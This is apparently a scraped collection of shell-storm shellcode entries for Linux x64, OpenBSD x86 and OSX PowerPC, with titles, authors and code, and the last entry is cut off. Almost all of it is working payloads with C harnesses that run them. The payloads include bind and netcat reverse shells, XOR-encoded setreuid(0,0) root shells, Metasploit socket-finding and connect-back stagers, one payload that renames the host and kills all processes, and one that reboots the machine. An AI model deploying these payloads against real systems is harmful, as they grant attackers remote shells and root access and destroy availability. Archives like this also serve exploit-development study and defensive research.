{"Title": "Linux/x64 - Bind (Random TCP Port) Shell + Null-Free Shellcode (57 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-859.php", "View": null, "code": ["/*", "", " Shell Bind TCP Random Port Shellcode - C Language - Linux/x86_64", " Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", " This program is free software: you can redistribute it and/or modify", " it under the terms of the GNU General Public License as published by", " the Free Software Foundation, either version 3 of the License, or", " (at your option) any later version.", "", " This program is distributed in the hope that it will be useful,", " but WITHOUT ANY WARRANTY; without even the implied warranty of", " MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", " GNU General Public License for more details.", "", " You should have received a copy of the GNU General Public License", " along with this program.  If not, see <http://www.gnu.org/licenses/>", "", "*/", "", "", "/*", "", "   shell_bind_tcp_random_port_shellcode_x86_64", "     assembly source: https://github.com/geyslan/SLAE/blob/master/improvements/shell_bind_tcp_random_port_x86_64.asm", "", "   * 57 bytes", "   * null-free", "", "", "   # gcc -m64 -fno-stack-protector -z execstack shell_bind_tcp_random_port_shellcode_x86_64.c -o shell_bind_tcp_random_port_shellcode_x86_64", "", "   Testing", "   # ./shell_bind_tcp_random_port_shellcode_x86_64", "   # netstat -anp | grep shell", "   # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)", "   # nc 127.0.0.1 port", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "", "\"\\x48\\x31\\xf6\\x48\\xf7\\xe6\\xff\\xc6\\x6a\\x02\"", "\"\\x5f\\xb0\\x29\\x0f\\x05\\x52\\x5e\\x50\\x5f\\xb0\"", "\"\\x32\\x0f\\x05\\xb0\\x2b\\x0f\\x05\\x57\\x5e\\x48\"", "\"\\x97\\xff\\xce\\xb0\\x21\\x0f\\x05\\x75\\xf8\\x52\"", "\"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"", "\"\\x57\\x54\\x5f\\xb0\\x3b\\x0f\\x05\";", "", "main ()", "{", "", "    // When contains null bytes, printf will show a wrong shellcode length.", "", "    printf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "    // Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "    __asm__ (\"mov $0xffffffffffffffff, %rax\\n\\t\"", "         \"mov %rax, %rbx\\n\\t\"", "         \"mov %rax, %rcx\\n\\t\"", "         \"mov %rax, %rdx\\n\\t\"", "         \"mov %rax, %rsi\\n\\t\"", "         \"mov %rax, %rdi\\n\\t\"", "         \"mov %rax, %rbp\\n\\t\"", "", "    // Calling the shellcode", "         \"call code\");", "", "}"]},
{"Title": "Linux/x64 - Bind (1337/TCP) Netcat (/bin/nc) Shell (/bin/sh) Shellcode (131 bytes)", "Author": "Gaussillusion", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-822.php", "View": null, "code": ["; { Title: Shellcode linux/x86-64 bind-shell with netcat }", "", "; Author    : Gaussillusion", "; Len       : 131 bytes", "; Language  : Nasm", "", "", "", "BITS 64", "xor    \trdx,rdx", "mov \trdi,0x636e2f6e69622fff", "shr\trdi,0x08", "push \trdi", "mov \trdi,rsp", "", "mov\trcx,0x68732f6e69622fff", "shr\trcx,0x08", "push \trcx", "mov\trcx,rsp", "", "mov     rbx,0x652dffffffffffff", "shr\trbx,0x30", "push\trbx", "mov\trbx,rsp", "", "mov\tr10,0x37333331ffffffff", "shr \tr10,0x20", "push \tr10", "mov\tr10,rsp", "", "mov\tr9,0x702dffffffffffff", "shr\tr9,0x30", "push \tr9", "mov\tr9,rsp", "", "mov \tr8,0x6c2dffffffffffff", "shr\tr8,0x30", "push \tr8", "mov\tr8,rsp", "", "push\trdx  ;push NULL", "push \trcx  ;push address of 'bin/sh'", "push\trbx  ;push address of '-e'", "push\tr10  ;push address of '1337'", "push\tr9   ;push address of '-p'", "push\tr8   ;push address of '-l'", "push \trdi  ;push address of '/bin/nc'", "", "mov    \trsi,rsp", "mov    \tal,59", "syscall", "", "; _bytecode_start_", ";\\x48\\x31\\xd2\\x48\\xbf\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x6e\\x63", ";\\x48\\xc1\\xef\\x08\\x57\\x48\\x89\\xe7\\x48\\xb9\\xff\\x2f\\x62", ";\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xe9\\x08\\x51\\x48\\x89\\xe1", ";\\x48\\xbb\\xff\\xff\\xff\\xff\\xff\\xff\\x2d\\x65\\x48\\xc1\\xeb", ";\\x30\\x53\\x48\\x89\\xe3\\x49\\xba\\xff\\xff\\xff\\xff\\x31\\x33", ";\\x33\\x37\\x49\\xc1\\xea\\x20\\x41\\x52\\x49\\x89\\xe2\\x49\\xb9", ";\\xff\\xff\\xff\\xff\\xff\\xff\\x2d\\x70\\x49\\xc1\\xe9\\x30\\x41", ";\\x51\\x49\\x89\\xe1\\x49\\xb8\\xff\\xff\\xff\\xff\\xff\\xff\\x2d", ";\\x6c\\x49\\xc1\\xe8\\x30\\x41\\x50\\x49\\x89\\xe0\\x52\\x51\\x53", ";\\x41\\x52\\x41\\x51\\x41\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05", "; _bytecode_end_"]},
{"Title": "Linux/x64 - Reverse (127.0.0.1:1337/TCP) Netcat (/bin/nc) Shell (/bin/sh) Shellcode (109 bytes)", "Author": "Gaussillusion", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-823.php", "View": null, "code": ["; { Title: Shellcode linux/x86-64 connect back shell }", "", "; Author    : Gaussillusion", "; Len       : 109 bytes", "; Language  : Nasm", "", ";syscall: execve(\"/bin/nc\",{\"/bin/nc\",\"ip\",\"1337\",\"-e\",\"/bin/sh\"},NULL)", "", "BITS 64", "xor    \trdx,rdx", "mov \trdi,0x636e2f6e69622fff", "shr\trdi,0x08", "push \trdi", "mov \trdi,rsp", "", "mov\trcx,0x68732f6e69622fff", "shr\trcx,0x08", "push \trcx", "mov\trcx,rsp", "", "mov     rbx,0x652dffffffffffff", "shr\trbx,0x30", "push\trbx", "mov\trbx,rsp", "", "mov\tr10,0x37333331ffffffff", "shr \tr10,0x20", "push \tr10", "mov\tr10,rsp", "", "jmp short ip", "continue:", "pop \tr9", "", "push\trdx  ;push NULL", "push \trcx  ;push address of 'bin/sh'", "push\trbx  ;push address of '-e'", "push\tr10  ;push address of '1337'", "push\tr9   ;push address of 'ip'", "push \trdi  ;push address of '/bin/nc'", "", "mov    \trsi,rsp", "mov    \tal,59", "syscall", "", "", "ip:", "\tcall  continue", "\tdb \"127.0.0.1\"", "", "", ";______________________bytecode_______________________", ";\\x48\\x31\\xd2\\x48\\xbf\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x6e\\x63", ";\\x48\\xc1\\xef\\x08\\x57\\x48\\x89\\xe7\\x48\\xb9\\xff\\x2f\\x62", ";\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xe9\\x08\\x51\\x48\\x89\\xe1", ";\\x48\\xbb\\xff\\xff\\xff\\xff\\xff\\xff\\x2d\\x65\\x48\\xc1\\xeb", ";\\x30\\x53\\x48\\x89\\xe3\\x49\\xba\\xff\\xff\\xff\\xff\\x31\\x33", ";\\x33\\x37\\x49\\xc1\\xea\\x20\\x41\\x52\\x49\\x89\\xe2\\xeb\\x11", ";\\x41\\x59\\x52\\x51\\x53\\x41\\x52\\x41\\x51\\x57\\x48\\x89\\xe6", ";\\xb0\\x3b\\x0f\\x05\\xe8\\xea\\xff\\xff\\xff\\x31\\x32\\x37\\x2e", ";\\x30\\x2e\\x30\\x2e\\x31", ";______________________bytecode_______________________"]},
{"Title": "Linux/x64 - setreuid(0,0) + execve(/bin/ash,NULL,NULL) + XOR Encoded Shellcode (85 bytes)", "Author": "egeektronic", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-815.php", "View": null, "code": ["# Title: Linux x86-64 setreuid (0,0) & execve(\"/bin/ash\",NULL,NULL) + XOR encoded - 85 bytes", "# Author: egeektronic <info (at) egeektronic {dot} com>", "# Twitter: @egeektronic", "# Tested on: Slackware 13.37", "# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer", "", "unsigned char shellcode[] = ", "\"\\x4d\\x31\\xc0\\x41\\xb1\\x7f\\xeb\\x1a\\x58\\x48\\x31\\xc9\\x48\\x31\\xdb\"", "\"\\x8a\\x1c\\x08\\x4c\\x39\\xc3\\x74\\x10\\x44\\x30\\xcb\\x88\\x1c\\x08\\x48\"", "\"\\xff\\xc1\\xeb\\xed\\xe8\\xe1\\xff\\xff\\xff\\x37\\x4e\\xbf\\x37\\xfc\\xbf\"", "\"\\x0e\\x37\\x4e\\x80\\x37\\x4e\\x89\\x70\\x7a\\x94\\x6f\\x37\\x4e\\xbf\\x37\"", "\"\\xfc\\xbf\\x44\\x20\\x37\\x4e\\x89\\x37\\x4e\\xad\\x70\\x7a\\x97\\x94\\x80\"", "\"\\x80\\x80\\x50\\x1d\\x16\\x11\\x50\\x1e\\x0c\\x17\";", "int main(void) { ((void (*)())shellcode)(); }"]},
{"Title": "Linux/x64 - setreuid(0,0) + execve(/bin/csh, [/bin/csh, NULL]) + XOR Encoded Shellcode (87 bytes)", "Author": "egeektronic", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-816.php", "View": null, "code": ["# Title: Linux x86-64 setreuid (0,0) & execve(\"/bin/csh\", [\"/bin/csh\", NULL]) + XOR encoded - 87 bytes", "# Author: egeektronic <info (at) egeektronic {dot} com>", "# Twitter: @egeektronic", "# Tested on: Slackware 13.37", "# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer", "", "unsigned char shellcode[] = ", "\"\\x4d\\x31\\xc0\\x41\\xb1\\xe3\\xeb\\x1a\\x58\\x48\\x31\\xc9\\x48\\x31\\xdb\"", "\"\\x8a\\x1c\\x08\\x4c\\x39\\xc3\\x74\\x10\\x44\\x30\\xcb\\x88\\x1c\\x08\\x48\"", "\"\\xff\\xc1\\xeb\\xed\\xe8\\xe1\\xff\\xff\\xff\\xab\\xd2\\x23\\xab\\x60\\x23\"", "\"\\x92\\xab\\xd2\\x1c\\xab\\xd2\\x15\\xec\\xe6\\x08\\xf1\\xab\\xd2\\x23\\xab\"", "\"\\x60\\x23\\xd8\\xbc\\xab\\xd2\\x31\\xb1\\xb4\\xab\\x6a\\x05\\xec\\xe6\\x0b\"", "\"\\x0a\\x1c\\x1c\\x1c\\xcc\\x81\\x8a\\x8d\\xcc\\x80\\x90\\x8b\";                                     ", "int main(void) { ((void (*)())shellcode)(); }"]},
{"Title": "Linux/x64 - setreuid(0,0) + execve(/bin/ksh, [/bin/ksh, NULL]) + XOR Encoded Shellcode (87 bytes)", "Author": "egeektronic", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-817.php", "View": null, "code": ["# Title: Linux x86-64 setreuid (0,0) & execve(\"/bin/ksh\", [\"/bin/ksh\", NULL]) + XOR encoded - 87 bytes", "# Author: egeektronic <info (at) egeektronic {dot} com>", "# Twitter: @egeektronic", "# Tested on: Slackware 13.37", "# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer", "", "unsigned char shellcode[] = ", "\"\\x4d\\x31\\xc0\\x41\\xb1\\x17\\xeb\\x1a\\x58\\x48\\x31\\xc9\\x48\\x31\\xdb\"", "\"\\x8a\\x1c\\x08\\x4c\\x39\\xc3\\x74\\x10\\x44\\x30\\xcb\\x88\\x1c\\x08\\x48\"", "\"\\xff\\xc1\\xeb\\xed\\xe8\\xe1\\xff\\xff\\xff\\x5f\\x26\\xd7\\x5f\\x94\\xd7\"", "\"\\x66\\x5f\\x26\\xe8\\x5f\\x26\\xe1\\x18\\x12\\xfc\\x05\\x5f\\x26\\xd7\\x5f\"", "\"\\x94\\xd7\\x2c\\x48\\x5f\\x26\\xc5\\x45\\x40\\x5f\\x9e\\xf1\\x18\\x12\\xff\"", "\"\\xfe\\xe8\\xe8\\xe8\\x38\\x75\\x7e\\x79\\x38\\x7c\\x64\\x7f\";                                    ", "int main(void) { ((void (*)())shellcode)(); }"]},
{"Title": "Linux/x64 - setreuid(0,0) + execve(/bin/zsh, [/bin/zsh, NULL]) + XOR Encoded Shellcode (87 bytes)", "Author": "egeektronic", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-818.php", "View": null, "code": ["# Title: Linux x86-64 setreuid (0,0) & execve(\"/bin/zsh\", [\"/bin/zsh\", NULL]) + XOR encoded - 87 bytes", "# Author: egeektronic <info (at) egeektronic {dot} com>", "# Twitter: @egeektronic", "# Tested on: Slackware 13.37", "# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer", "", "unsigned char shellcode[] = ", "\"\\x4d\\x31\\xc0\\x41\\xb1\\x3c\\xeb\\x1a\\x58\\x48\\x31\\xc9\\x48\\x31\\xdb\"", "\"\\x8a\\x1c\\x08\\x4c\\x39\\xc3\\x74\\x10\\x44\\x30\\xcb\\x88\\x1c\\x08\\x48\"", "\"\\xff\\xc1\\xeb\\xed\\xe8\\xe1\\xff\\xff\\xff\\x74\\x0d\\xfc\\x74\\xbf\\xfc\"", "\"\\x4d\\x74\\x0d\\xc3\\x74\\x0d\\xca\\x33\\x39\\xd7\\x2e\\x74\\x0d\\xfc\\x74\"", "\"\\xbf\\xfc\\x07\\x63\\x74\\x0d\\xee\\x6e\\x6b\\x74\\xb5\\xda\\x33\\x39\\xd4\"", "\"\\xd5\\xc3\\xc3\\xc3\\x13\\x5e\\x55\\x52\\x13\\x46\\x4f\\x54\";                                     ", "int main(void) { ((void (*)())shellcode)(); }"]},
{"Title": "Linux/x64 - sethostname(Rooted !) + killall Shellcode (33 bytes)", "Author": "zbt", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-605.php", "View": null, "code": ["# Linux/x86_64 sethostname() & killall 33 bytes shellcode", "# Date: 2010-04-26", "# Author: zbt", "# Tested on: x86_64 Debian GNU/Linux", " ", " ", "/*", "    ; sethostname(\"Rooted !\");", "    ; kill(-1, SIGKILL);", " ", " ", "    section .text", "        global _start", " ", "    _start:", " ", "        ;-- setHostName(\"Rooted !\"); 22 bytes --;", "        mov     al, 0xaa", "        mov     r8, 'Rooted !'", "        push    r8", "        mov     rdi, rsp", "        mov     sil, 0x8", "        syscall", " ", "        ;-- kill(-1, SIGKILL); 11 bytes --;", "        push    byte 0x3e", "        pop     rax", "        push    byte 0xff", "        pop     rdi", "        push    byte 0x9", "        pop     rsi", "        syscall", "*/", "int main(void)", "{", "    char shellcode[] =", "    \"\\xb0\\xaa\\x49\\xb8\\x52\\x6f\\x6f\\x74\\x65\\x64\\x20\\x21\\x41\\x50\\x48\\x89\"", "    \"\\xe7\\x40\\xb6\\x08\\x0f\\x05\\x6a\\x3e\\x58\\x6a\\xff\\x5f\\x6a\\x09\\x5e\\x0f\\x05\";", " ", "    (*(void (*)()) shellcode)();", " ", "    return 0;", "}"]},
{"Title": "OpenBSD/x86 - reboot() Shellcode (15 bytes)", "Author": "beosroot", "Published": ": 2009-01-01", "Platform": "OpenBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-600.php", "View": null, "code": ["//   ----------bsd/x86 reboot() shellcode-----------------", "", "//  AUTHOR : beosroot", "//  INFO   : OpenBSD x86 reboot() shellcode", "//  EMAIL :  beosroot@null.net", "//           beosroot@hotmail.fr", "", "", "char shellcode[] = \"\\x31\\xc0\\x66\\xba\\x0e\\x27\\x66\\x81\\xea\\x06\\x27\\xb0\\x37\\xcd\\x80\";", "", "int main() {", "", "  int *ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}", "", "", "// the end o.O"]},
{"Title": "OSX/PPC - Remote findsock by recv() Key Shellcode", "Author": "Dino Dai Zovi", "Published": ": 2009-01-01", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-121.php", "View": null, "code": [";;;", ";;; PowerPC OSX remote findsock by recv() key shellcode", ";;;", ";;; Dino Dai Zovi < ddz@theta44.org >, 20040816", ";;;", "", ".globl _shellcode", ".text", "", ".set KEY, 0x5858580a", ".set PTHREAD_EXIT, 0x90017021\t; OSX 10.3.X", "", "_shellcode:", "Lfindsock:", "\taddis\tr27, 0, hi16(KEY)", "\tori\tr27, r27, lo16(KEY)", "\taddis\tr31, 0, hi16(0xffff0000)", "\tsrawi\tr31, r31, 11", "\tmtctr\tr31", "", "\t;; Count down sockets backwards in hopes of getting our most recent", "\t;; connection (if we have multiple).", "L0:\tmfctr\tr3", "\taddi\tr3, r3, -1\t; r3 = socket file descriptor", "", "\taddi\tr4, r1, -4\t; r4 = stack buffer", "\tsub\tr5, r1, r4\t; r5 = 4", "\tli\tr6, 0x4140", "\tsrawi\tr6, r6, 7\t; r6 = MSG_PEEK | MSG_DONTWAIT", "\taddi\tr7, r5, -4\t; r7 = 0", "\taddi\tr8, r5, -4\t; r8 = 0", "\tli\tr30, 0x3aff", "\tsrawi\tr0, r30, 9\t; load syscall number into r0", "\tcmplw\tr29, r29", "", "\t.long\t0x44ffff02\t; recvfrom(s, buf, 4, 0x82, 0, 0)", "\tbdnzt\teq, L0", "\t;; On syscall error, attempt compare anyway and loop", "\t", "\tlwz\tr28, -4(r1)", "\tcmplw\tr28, r27", "\tbdnzf\teq, L0", "\t;;; At this point our socket fd is in ctr", "", ";;;", ";;; dup2(2) our socket (in ctr) to stdin, stdout, stderr", ";;; \t", "Ldup_fds:", "\tli\tr30, 0x2d01", "\tsrawi\tr0, r30, 7", "\tli\tr30, 0x666", "\tsrawi\tr30, r30, 9", "\t", "\tmfctr\tr3", "\taddi\tr4, r30, -1", "\t.long\t0x44ffff02\t; dup2(sock, 2)", "\t.long\t0x7c842008", "\t", "\tmfctr\tr3", "\taddi\tr4, r30, -2", "\t.long\t0x44ffff02\t; dup2(sock, 1)", "\t.long\t0x7c842008\t", "\t", "\tmfctr\tr3", "\taddi\tr4, r30, -3", "\t.long\t0x44ffff02\t; dup2(sock, 0)", "\t.long\t0x7c842008", "", ";;;", ";;; VForking shellcode - Call vfork() and execute /bin/sh in child process.  ", ";;; In parent, we exec \"/bin/si\" (\"/bin/sh\" + 1), fail, and run the code that ", ";;; follows the execve().", ";;;", "Lfork_execve_binsh:", "        ;; call vfork (necessary to exec in threaded programs)", "\tli\tr30, 0x42ff", "\tsrawi\tr0, r30, 8 ", "\t.long\t0x44ffff02", "\t.long\t0x7c842008", "", " \txor\tr31, r31, r31", " \tlis\tr30, 0x2f2f", " \taddi\tr30, r30, 0x7367", "\tadd\tr30, r30, r4\t; In child, $r4 should be zero", " \tlis\tr29, 0x2f62", " \taddi\tr29, r29, 0x696e", "\txor\tr28, r28, r28", "\taddi\tr27, r1, -12", " \tstmw\tr27, -12(r1)\t; -12 is arbitrary null-eliding constant", "", " \taddi\tr4, r1, -12", "\taddi\tr3, r1, -4", " \txor\tr5, r5, r5", " \tli\tr30, 30209", " \tsrawi\tr0, r30, 9\t; r0 = 59", " \t.long\t0x44ffff02\t; execve(path, argv, NULL)", "Lparent:", "", ";;;", ";;; Call pthread_exit in parent process", ";;;", "Lpthexit:", "\taddis\tr31, 0, hi16(PTHREAD_EXIT) ; pthread_exit", "\tori\tr31, r31, lo16(PTHREAD_EXIT)", "\tmtctr\tr31", "\tbctrl"]},
{"Title": "OSX/PPC - Stager Sock Find MSG_PEEK + Null-Free Shellcode", "Author": "H D Moore", "Published": ": 2009-01-01", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-123.php", "View": null, "code": [";;", ";", ";        Name: stager_sock_find_peek", ";   Qualities: Null-Free", ";   Platforms: MacOS X / PPC", ";     Authors: H D Moore < hdm [at] metasploit.com >", ";     Version: $Revision: 1.1 $", ";     License:", ";", ";        This file is part of the Metasploit Exploit Framework", ";        and is subject to the same licenses and copyrights as", ";        the rest of this package.", ";", "; Description:", ";", ";        This payload will recv() downward until the read", ";        data contains the search tag (0xXXXX1337). Once the", ";        tag is located, it will jump into the payload. The", ";        recv() call is passed the MSG_PEEK flag, the stage", ";        will need to flush the recv() queue before doing", ";        something like dup2'ing a shell.", ";", ";;", "", ".globl _main", ".text", "_main:", "\tli\t\tr29, 0xfff", "\tli\t\tr30, 0xfff", "\taddic.\tr28, r29, -0xfff +1", "", "findsock:", "\tsubf.   r30, r28, r30", "\tblt\t\t_main", "", "\tsubi\tr0, r29, 0xfff - 102", "\tmr\t\tr3, r30", "\tsubi\tr4, r1, 4104", "\tli\t\tr5, 4095", "\tsubi\tr6, r29, 0xfff - 0x82", "\t.long\t0x44ffff02", "\txor.\tr6, r6, r6", "\t", "\tlhz\t\tr27, -4104(r1)", "\tcmpwi\tr27, 0x1337", "\tbne\t\tfindsock", "", "gotsock:", "\tsubi\tr4, r1, 4100", "\tmtctr\tr4", "\tblectr\t", "\txor.\tr6, r6, r6"]},
{"Title": "OSX/PPC - Stager Sock Find Shellcode", "Author": "H D Moore", "Published": ": 2009-01-01", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-124.php", "View": null, "code": [";;", ";", ";        Name: stager_sock_find", ";   Qualities: Can Have Nulls", ";   Platforms: MacOS X / PPC", ";     Authors: H D Moore < hdm [at] metasploit.com >", ";     Version: $Revision: 1.1 $", ";     License:", ";", ";        This file is part of the Metasploit Exploit Framework", ";        and is subject to the same licenses and copyrights as", ";        the rest of this package.", ";", "; Description:", ";", ";        This payload will recv() downward until the read", ";        data contains the search tag (0xXXXX1337). Once the", ";        tag is located, it will jump into the payload.", ";", ";;", "", ".globl _main", ".text", "_main:", "\tli \tr29, 0xfff", "\tli\tr30, 0xfff", "\taddic.\tr28, r29, -0xfff +1", "", "findsock:", "\tsubf.   r30, r28, r30", "\tblt\t_main", "", "\tsubi\tr0, r29, 0xfff - 102", "\tmr\tr3, r30", "\tsubi\tr4, r1, 4104", "\tli \tr5, 4095", "\tsubi    r6, r29, 0xfff - 0x80", "\t.long   0x44ffff02", "\txor.\tr6, r6, r6", "\t", "\tlhz\tr27, -4104(r1)", "\tcmpwi\tr27, 0x1337", "\tbne\tfindsock", "", "gotsock:", "\tsubi\tr4, r1, 4100", "\tmtctr\tr4", "\tblectr\t", "\txor.\tr6, r6, r6"]},
{"Title": "OSX/PPC - Stager Sock Reverse Shellcode", "Author": "H D Moore", "Published": ": 2009-01-01", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-125.php", "View": null, "code": [";;", ";", ";        Name: stager_sock_reverse_nf.asm", ";   Qualities: Null-Free", ";   Platforms: MacOS X / PPC", ";     Authors: H D Moore < hdm [at] metasploit.com >", ";     Version: $Revision: 1.1 $", ";     License:", ";", ";        This file is part of the Metasploit Exploit Framework", ";        and is subject to the same licenses and copyrights as", ";        the rest of this package.", ";", "; Description:", ";", ";        Connects back, reads 8192 bytes, jumps into payload.", ";        Socket descriptor is left in r30.", ";", ";;", "", "", ".globl _main", ".text", "_main:", "", "_socket:\t", "\tli\t\tr27, 0x3030 + 97", "\tsubi\tr0, r27, 0x3030 + 97 - 97", "\tsubi\tr3, r27, 0x3030 + 97 - 2", "\tsubi\tr4, r27, 0x3030 + 97 - 1", "\tsubi\tr5, r27, 0x3030 + 97 - 6", "", "\t.long\t0x44ffff02", "\txor\t\tr5, r5, r5", "\tmr\t\tr30, r3", "", "_storeaddr:", "", "\t; port - patch the xor word", "\tli\t\tr25, (0x2211^0x4142)", "\txori\tr25, r25, 0x4142", "\tsubi\tr29, r27, 0x3030 + 97 - 2", "\tslwi\tr29, r29, 16\t", "\tor\t\tr29, r29, r25", "\tstw\t\tr29, -20(r1)", "", "\t; addr - patch the xor dword", "\tlis\t\tr29, hi16(0x7f000001^0x01020304)", "\tori\t\tr29, r29, lo16(0x7f000001^0x01020304)", "\tlis\t\tr28, hi16(0x01020304)", "\tori\t\tr28, r28, lo16(0x01020304)", "\txor\t\tr29, r29, r28", "\tstw\t\tr29, -16(r1)", "", "konnect:", "\tla\t\tr4, -20(r1)", "\tsubi\tr5, r27, 0x3030 + 97 - 16", "\tsubi\tr0, r27, 0x3030 + 97 - 98", "\tmr\t\tr3, r30", "\t.long\t0x44ffff02", "\txor\t\tr5, r5, r5", "\t\t", "reader:", "\tli\t\tr29, 0x3330", "\tsrawi\tr29, r29, 12", "", "\tsubi\tr0, r27, 0x3030 + 97 - 3", "\tmr\t\tr3, r30", "\tsubi\tr4, r1, 8192+44", "\tli\t\tr5, 8192+44", "\tmtctr\tr4", "\t.long\t0x44ffff02", "\txor\t\tr5, r5, r5", "\txor.\tr5, r5, r5", "\tblectr", "\txor\t\tr5, r5, r5"]},
{"Title": "OSX/PPC - Bind (8000/TCP) Shell + OSXPPCLongXOR Encoded Shellcode (300 bytes)", "Author": "H D Moore", "Published": ": 2009-01-01", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-312.php", "View": null, "code": ["\"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\\x7f\\xe8\\x02\\xa6\\x3b\\xff\\x07\\xfa\"", "\"\\x38\\xa5\\xf8\\x4a\\x3c\\xc0\\x28\\x1a\\x60\\xc6\\x7f\\x0e\\x38\\x85\\x07\\xee\"", "\"\\x7c\\x89\\x03\\xa6\\x80\\x9f\\xf8\\x4a\\x7c\\x84\\x32\\x78\\x90\\x9f\\xf8\\x4a\"", "\"\\x7c\\x05\\xf8\\xac\\x7c\\xff\\x04\\xac\\x7c\\x05\\xff\\xac\\x3b\\xc5\\x07\\xba\"", "\"\\x7f\\xff\\xf2\\x15\\x42\\x20\\xff\\xe0\\x4c\\xff\\x01\\x2c\\x10\\x7a\\x7f\\x0c\"", "\"\\x10\\x9a\\x7f\\x0f\\x10\\xba\\x7f\\x08\\x10\\x1a\\x7f\\x6f\\x6c\\x1a\\x7f\\x0c\"", "\"\\x54\\x1a\\x7d\\x76\\x54\\x64\\x64\\x76\\x60\\x1a\\x7f\\x03\\x28\\x18\\x60\\x4e\"", "\"\\x28\\x1a\\x7f\\x0e\\x54\\x92\\x7d\\xa8\\x10\\xba\\x7f\\x1e\\x10\\x1a\\x7f\\x66\"", "\"\\x57\\xd9\\x8c\\x76\\x6c\\x1a\\x7f\\x0c\\x54\\x1a\\x7d\\x76\\x10\\x1a\\x7f\\x64\"", "\"\\x57\\xd9\\x8c\\x76\\x6c\\x1a\\x7f\\x0c\\x54\\x1a\\x7d\\x76\\x57\\xd9\\x8c\\x76\"", "\"\\x10\\x1a\\x7f\\x10\\x10\\x9a\\x7f\\x1e\\xb8\\x9b\\x80\\xe6\\x10\\xbb\\x80\\xe6\"", "\"\\x10\\x9b\\x80\\xfe\\x6c\\x1a\\x7f\\x0c\\x54\\x1a\\x7d\\x76\\x54\\x64\\x64\\x76\"", "\"\\x10\\xba\\x7f\\x0c\\x10\\x1a\\x7f\\x54\\x57\\xd9\\x8c\\x76\\x54\\xbe\\x54\\x76\"", "\"\\x6c\\x1a\\x7f\\x0c\\x54\\x1a\\x7d\\x76\\x10\\xbf\\x80\\xf1\\x04\\x1f\\x80\\xf1\"", "\"\\x68\\x98\\x80\\xeb\\x10\\x1a\\x7f\\x4c\\x6c\\x1a\\x7f\\x0c\\x54\\x1a\\x7d\\x76\"", "\"\\x54\\xbf\\x55\\x77\\x68\\x98\\x80\\xf3\\x54\\x72\\x7d\\xa8\\x10\\x79\\x7f\\x26\"", "\"\\xb8\\x7b\\x80\\xf6\\xb8\\xbb\\x80\\xf2\\x10\\x9b\\x80\\xf6\\x10\\x1a\\x7f\\x35\"", "\"\\x54\\x1a\\x7b\\xa2\\x6c\\x1a\\x7f\\x0c\\x54\\x1a\\x7d\\x76\\x57\\xfa\\x7f\\x06\"", "\"\\x07\\x78\\x16\\x60\\x07\\x79\\x0c\\x66\\x28\\x1a\\x7f\\x0e\";"]},
{"Title": "OSX/PPC - execve(/bin/sh) + Null-Free Shellcode", "Author": "ghandi", "Published": ": 2009-01-01", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-120.php", "View": null, "code": [";;; $Id: ppc-execve.s,v 1.1 2003/03/01 01:10:48 ghandi Exp $", ";;; PPC MacOS X (maybe others) shellcode", ";;;", ";;; After assembly, change bytes 2 and 3 of the 'sc' instruction encoding", ";;; from 0x00 to 0xff.", ";;;", ";;; ghandi < ghandi@mindless.com >", ";;;", "\t", ".globl _execve_binsh", ".text", "_execve_binsh:", "    \t;; Don't branch, but do link.  This gives us the location of", "\t;; our code.  Move the address into GPR 31.", "\txor.\tr5, r5, r5\t; r5 = NULL", "\tbnel\t_execve_binsh", "\tmflr\tr31", "", "\t;; Use the magic offset constant 268 because it makes the", "        ;; instruction encodings null-byte free.", "\taddi\tr31, r31, 268+36", "\taddi\tr3, r31, -268\t; r3 = path", "", "        ;; Create argv[] = {path, 0} in the \"red zone\" on the stack", "\tstw\tr3, -8(r1)\t; argv[0] = path", "\tstw\tr5, -4(r1)\t; argv[1] = NULL", "\tsubi\tr4, r1, 8\t; r4 = {path, 0}", "", "\t;; 59 = 30209 >> 9    (trick to avoid null-bytes)", "\tli\tr30, 30209 ", "\tsrawi\tr0, r30, 9\t; r0 = 59", "\tsc\t\t\t; execve(path, argv, NULL)", "path:   .asciz 